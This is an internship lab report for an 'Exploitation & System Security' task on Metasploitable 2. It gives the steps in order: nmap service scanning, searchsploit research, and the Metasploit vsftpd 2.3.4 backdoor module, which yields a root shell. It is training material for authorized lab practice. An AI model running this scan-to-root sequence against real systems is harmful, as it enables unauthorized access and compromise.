# Task 4: Exploitation & System Security

## ApexPlanet Cybersecurity & Ethical Hacking Internship

### 1. Objective

To understand vulnerability identification and controlled exploitation in an authorized virtual lab environment.

### 2. Tools Used

- Kali Linux
- Metasploitable 2
- Nmap
- Metasploit Framework
- SearchSploit

### 3. Lab Environment

| Machine | IP Address |
|---|---|
| Kali Linux (Attacker) | 192.168.91.130 |
| Metasploitable 2 (Target) | 192.168.91.129 |

### 4. Practical Implementation

#### Step 1: Lab Connectivity Verification

Verified network connectivity between Kali Linux and Metasploitable 2.

```bash
ping -c 4 192.168.91.129
```

#### Step 2: Network Scanning

Identified open ports and running services using Nmap.

```bash
nmap -sV 192.168.91.129
```

#### Step 3: FTP Service Identification

Identified the FTP service on port 21.

```bash
nmap -sC -sV -p 21 192.168.91.129
```

The service banner reported vsftpd 2.3.4.

#### Step 4: Vulnerability Research

Searched for known vulnerabilities associated with the FTP service.

```bash
searchsploit vsftpd 2.3.4
```

#### Step 5: Controlled Exploitation

Used the Metasploit Framework to test the known FTP backdoor vulnerability in the authorized lab.

**Metasploit module:**

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

The exploitation attempt successfully opened a command shell.

#### Step 6: Access Verification

Verified the obtained access using:

```bash
whoami
id
hostname
```

**Observed results:**

- Username: root
- UID: 0
- GID: 0
- Hostname: Metasploitable

### 5. Practical Screenshots

#### SS 4.1 — Lab Connectivity Verification

<img width="549" height="200" alt="Screenshot 2026-11-10 210738" src="https://github.com/user-attachments/assets/e34b6cce-1fba-4366-a459-be049bb8415c" />

#### SS 4.2 — Nmap Service and Port Scanning

<img width="1002" height="584" alt="Screenshot 2026-11-10 210803" src="https://github.com/user-attachments/assets/f1bae1d5-d0f8-4c78-908c-41f5c1699d37" />

#### SS 4.3 — Successful Exploitation and Root Access

<img width="746" height="162" alt="Screenshot 2026-11-10 211015" src="https://github.com/user-attachments/assets/ba9d10df-b1e0-427e-8aab-874fbf58f55a" />

### 6. Key Findings

- Verified connectivity between the lab machines.
- Identified open ports and running services.
- Identified the FTP service reporting vsftpd 2.3.4.
- Researched the associated vulnerability using SearchSploit.
- Successfully obtained a command shell through controlled exploitation.
- Verified root-level privileges on the target machine.

### 7. Conclusion

Successfully performed network connectivity verification, service identification, vulnerability research, and controlled exploitation in an authorized virtual lab environment. This practical demonstrated how vulnerable services can expose systems to unauthorized access and highlighted the importance of identifying and securing vulnerable services.
